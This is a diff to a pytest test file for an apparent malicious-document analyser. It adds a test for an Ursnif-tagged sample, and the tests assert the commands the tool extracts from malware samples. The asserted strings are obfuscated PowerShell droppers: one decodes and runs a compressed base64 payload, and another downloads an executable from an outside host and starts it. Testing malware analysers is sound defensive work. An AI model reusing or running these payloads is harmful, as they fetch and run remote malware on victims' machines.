@@ -284,3 +284,22 @@ def test_f6de41b01aa340613e87bbd93e4c2c061b4c37b7fc10fa7bf2b7d94c63748145(path):
 	t=maldoc(path+'f6de41b01aa340613e87bbd93e4c2c061b4c37b7fc10fa7bf2b7d94c63748145')
 	r=t.run()
 	assert r[0][1][1] == """cmd.exe /c powershell "\'powershell ""Start-Sleep 60;$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\'\'H4sIAAAAAAAA/3SQwWqzQBSFX+WCgkoS8/vvGpPQJ+iqu7aLcTzW244z05mbGBHfvVQKhUKXl3v4Dt/pLlYLO0vHRAcoQXKmB9zkEd5P+VOUwPb1hVLovirmVFhXp6qWMM25xbhzzRu0UJyiYCgtpBzRaMOwQscENx6SMxVl60ZrnGo7NshX1jaFvR4Eg99kzzL4u/8lbsiKetFKdP/d9K9eAuQSLK13vaTdBdXpPs965SFuigFXxhhL7YZ9i7Jh47jNtpkz3LlguMOvV1F3LkDpnvI0OCG2tEKLmbv8xzzrRfxhv882X6mCdvigqpibAPVeL7TUx+SqDLfrYlFUkJ0PTiNGyv9S+wwAAP//biF2KmwBAAA=\'\'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\'""| out-file -filepath %tmp%\\cmd048.bat -encoding ascii; cmd /c \'%tmp%\\cmd048.bat\'"""
+
+@pytest.mark.ursnif
+@pytest.mark.slow
+@pytest.mark.doc
+@pytest.mark.func_Array
+@pytest.mark.func_CInt
+@pytest.mark.func_CStr
+@pytest.mark.func_CVErr
+@pytest.mark.func_Chr
+@pytest.mark.func_Hex
+@pytest.mark.func_InStrRev
+@pytest.mark.func_IsError
+@pytest.mark.func_IsNumeric
+@pytest.mark.func_Join
+@pytest.mark.func_VarType
+def test_ad97be694b63519fe2d8f8d89509aaa3c976d82c970f119c2e8f7c31056936d7(path):
+	t=maldoc(path+'ad97be694b63519fe2d8f8d89509aaa3c976d82c970f119c2e8f7c31056936d7')
+	r=t.run()
+	assert r[0][1][1] == '''cmd.exe /c P^o^W^e^r^s^H^e^L^L^.^e^x^e^ ^-^E^C^ ^K^A^B^O^A^G^U^A^d^w^A^t^A^E^8^A^Y^g^B^q^A^G^U^A^Y^w^B^0^A^C^A^A^U^w^B^5^A^H^M^A^d^A^B^l^A^G^0^A^L^g^B^O^A^G^U^A^d^A^A^u^A^F^c^A^Z^Q^B^i^A^E^M^A^b^A^B^p^A^G^U^A^b^g^B^0^A^C^k^A^L^g^B^E^A^G^8^A^d^w^B^u^A^G^w^A^b^w^B^h^A^G^Q^A^R^g^B^p^A^G^w^A^Z^Q^A^o^A^C^I^A^a^A^B^0^A^H^Q^A^c^A^A^6^A^C^8^A^L^w^B^3^A^G^8^A^Y^Q^B^0^A^G^k^A^b^g^B^r^A^H^c^A^b^w^B^v^A^C^4^A^Y^w^B^v^A^G^0^A^L^w^B^S^A^F^U^A^S^Q^A^v^A^G^w^A^Z^Q^B^2^A^G^8^A^b^g^B^k^A^C^4^A^c^A^B^o^A^H^A^A^P^w^B^s^A^D^0^A^c^g^B^l^A^G^U^A^e^g^B^h^A^D^Q^A^L^g^B^4^A^G^E^A^c^A^A^i^A^C^w^A^I^A^A^k^A^G^U^A^b^g^B^2^A^D^o^A^Q^Q^B^Q^A^F^A^A^R^A^B^B^A^F^Q^A^Q^Q^A^g^A^C^s^A^I^A^A^n^A^F^w^A^M^Q^B^j^A^D^g^A^M^w^A^0^A^D^g^A^Z^g^A^0^A^C^4^A^Z^Q^B^4^A^G^U^A^J^w^A^p^A^D^s^A^I^A^B^T^A^H^Q^A^Y^Q^B^y^A^H^Q^A^L^Q^B^Q^A^H^I^A^b^w^B^j^A^G^U^A^c^w^B^z^A^C^A^A^J^A^B^l^A^G^4^A^d^g^A^6^A^E^E^A^U^A^B^Q^A^E^Q^A^Q^Q^B^U^A^E^E^A^J^w^B^c^A^D^E^A^Y^w^A^4^A^D^M^A^N^A^A^4^A^G^Y^A^N^A^A^u^A^G^U^A^e^A^B^l^A^C^c^A^O^w^A^g^A^E^U^A^e^A^B^p^A^H^Q^A^O^w^A^='''
